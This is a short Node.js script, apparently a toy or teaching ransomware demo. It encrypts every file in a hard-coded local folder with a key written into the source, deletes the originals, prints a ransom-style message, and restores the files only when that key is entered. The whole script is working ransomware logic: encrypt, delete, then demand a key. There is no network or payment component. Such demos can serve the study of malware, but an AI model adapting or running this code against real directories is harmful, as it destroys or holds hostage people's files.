const encryptor = require("file-encryptor");
const readlineSync = require("readline-sync");
const fs = require("fs");

const key = "ThisisaSecretKey0909";
const BanoImportantFiles = "./BanoImportantFiles/";

const files = fs.readdirSync(BanoImportantFiles);
let filesEncrypted = 0;

files.forEach((file) => {
  encryptor.encryptFile(`${BanoImportantFiles}${file}`,`${BanoImportantFiles}${file}.encrypt`,key,
    function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }
      fs.unlinkSync(`${BanoImportantFiles}${file}`);
      filesEncrypted++;
      if (filesEncrypted === files.length) {
        console.log(
          `Your files have been encrypted. If you want to decrypt them, enter the decryption key. Type "quit" to exit.`
        );
        startDecryption();
      }
    }
  );
});

function startDecryption() {
  while (true) {
    const decryptionKey = readlineSync.question("Please Enter The Decryption Key Needed: ");

    if (decryptionKey.toLowerCase() === "quit") {
      console.log("Exiting the process....");
      process.exit(1);
    }

    if (decryptionKey === key) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log(
        'Incorrect decryption key. Please try again to continue or type "exit" to quit.'
      );
    }
  }
}

function decryptFiles(decryptionKey) {
  const decryptedfiles = fs.readdirSync(BanoImportantFiles);
  let filesDecrypted = 0;

  decryptedfiles.forEach((file) => {
    encryptor.decryptFile(
      `${BanoImportantFiles}${file}`,`${BanoImportantFiles}${file.replace(".encrypt", "")}`,decryptionKey,
      function (err) {
        if (err) {
          console.error("Error decrypting file:", err);
          return;
        }

        fs.unlinkSync(`${BanoImportantFiles}${file}`);
        filesDecrypted++;

        if (filesDecrypted === decryptedfiles.length) {
          console.log("Congratulations, Your Files Have been Decrypted Thank you, Be Careful Next Time.");
          process.exit(1);
        }
      }
    );
  });
}
